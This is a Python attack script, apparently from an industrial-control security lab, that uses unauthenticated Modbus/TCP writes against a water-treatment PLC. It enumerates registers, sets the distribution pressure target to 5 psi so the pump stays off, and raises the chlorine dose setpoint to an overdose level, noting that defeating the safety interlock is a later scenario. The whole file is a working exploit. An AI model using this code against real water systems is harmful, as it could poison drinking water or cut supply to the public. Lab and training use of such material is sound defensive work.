#!/usr/bin/env python3
"""Scenarios 4 and 5, Modbus/TCP against plc-water. No authentication exists in
the protocol, so a bare pymodbus client is the whole exploit.

  modbus_attack.py enum                 read the coils and registers
  modbus_attack.py stop-dist            collapse the distribution pressure target (scenario 4)
  modbus_attack.py overdose [ppm]       raise the chlorine dose setpoint (scenario 5, default 15)
  modbus_attack.py restore              put the setpoints back
"""
import sys

from pymodbus.client import ModbusTcpClient

import targets as T

# from plc-water/mapfile.py
HR_DOSE_SP_X100 = 0
HR_DIST_PRESS_TARGET = 1

c = ModbusTcpClient(T.guard(T.PLC_WATER), port=T.MODBUS_PORT, timeout=3)
c.connect()


def enum():
    co = c.read_coils(0, 8, slave=1)
    di = c.read_discrete_inputs(0, 8, slave=1)
    hr = c.read_holding_registers(0, 16, slave=1)
    ir = c.read_input_registers(0, 8, slave=1)
    print("coils   :", list(map(int, co.bits[:8])))
    print("discrete:", list(map(int, di.bits[:8])))
    print("holding :", hr.registers)
    print("input   :", ir.registers)
    print("\nno auth, no session, no signing. read is write.")


def stop_dist():
    print("[*] writing distribution pressure target = 5 psi")
    c.write_register(HR_DIST_PRESS_TARGET, 5, slave=1)
    print("    the control loop will now hold the high-service pump OFF.")
    print("    watch the header bleed to zero on the HMI (PT-401).")


def overdose():
    ppm = float(sys.argv[2]) if len(sys.argv) > 2 else 15.0
    print(f"[*] writing chlorine dose setpoint = {ppm:.1f} ppm "
          f"(register {HR_DOSE_SP_X100} = {int(ppm * 100)})")
    c.write_register(HR_DOSE_SP_X100, int(ppm * 100), slave=1)
    print("    the residual will chase the setpoint until the PLC's overdose")
    print("    interlock trips. Defeating that interlock is scenario 9.")


def restore():
    c.write_register(HR_DOSE_SP_X100, 250, slave=1)
    c.write_register(HR_DIST_PRESS_TARGET, 60, slave=1)
    print("[*] setpoints restored (dose 2.5 ppm, header 60 psi)")


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "enum"
    {"enum": enum, "stop-dist": stop_dist, "overdose": overdose,
     "restore": restore}.get(cmd, lambda: print(__doc__))()
